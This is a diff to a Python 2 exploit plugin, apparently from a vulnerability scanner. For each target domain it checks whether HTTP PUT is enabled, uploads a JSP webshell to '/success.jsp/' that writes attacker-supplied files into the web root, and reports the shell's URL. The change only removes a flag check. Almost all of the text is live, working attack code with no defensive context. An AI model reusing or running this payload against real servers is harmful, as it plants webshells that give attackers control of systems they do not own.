@@ -18,25 +18,24 @@ def get_plugin_info():
 
 def exploit(ip):
     result = []
-    if FindDomain_flag:
-        if Domain:
-            for domain in Domain:
-                    body = """<%  if(request.getParameter("f")!=null)(new java.io.FileOutputStream(application.getRealPath("/")+request.getParameter("f"))).write(request.getParameter("t").getBytes()); %>"""
-                    #body = '''upload success!'''
-                    try:
-                        resp = requests.options(domain)
-                        if 'allow' in resp.headers and resp.headers['allow'].find('PUT') > 0 :
-                            url = domain+'/success.jsp/'
-                            #url = "/" + str(int(time.time()))+'.jsp::$DATA'
-                            resp_put = requests.put(url, data=body)
-                            if resp_put.status  == 201 :
-                                result.append('webshell:'+url[:-1])
-                            elif resp_put.status == 204 :
-                                result.append('%s >>>> 开启了PUT方法且webshell已存在'%domain)
-                            else:
-                                result.append('%s >>>> 开启了PUT方法'%domain)
-                    except Exception,e:
-                        logging.error(e)
-                        pass
-            if len(result):
-                return result
+    if Domain:
+        for domain in Domain:
+                body = """<%  if(request.getParameter("f")!=null)(new java.io.FileOutputStream(application.getRealPath("/")+request.getParameter("f"))).write(request.getParameter("t").getBytes()); %>"""
+                #body = '''upload success!'''
+                try:
+                    resp = requests.options(domain)
+                    if 'allow' in resp.headers and resp.headers['allow'].find('PUT') > 0 :
+                        url = domain+'/success.jsp/'
+                        #url = "/" + str(int(time.time()))+'.jsp::$DATA'
+                        resp_put = requests.put(url, data=body)
+                        if resp_put.status  == 201 :
+                            result.append('webshell:'+url[:-1])
+                        elif resp_put.status == 204 :
+                            result.append('%s >>>> 开启了PUT方法且webshell已存在'%domain)
+                        else:
+                            result.append('%s >>>> 开启了PUT方法'%domain)
+                except Exception,e:
+                    logging.error(e)
+                    pass
+        if len(result):
+            return result
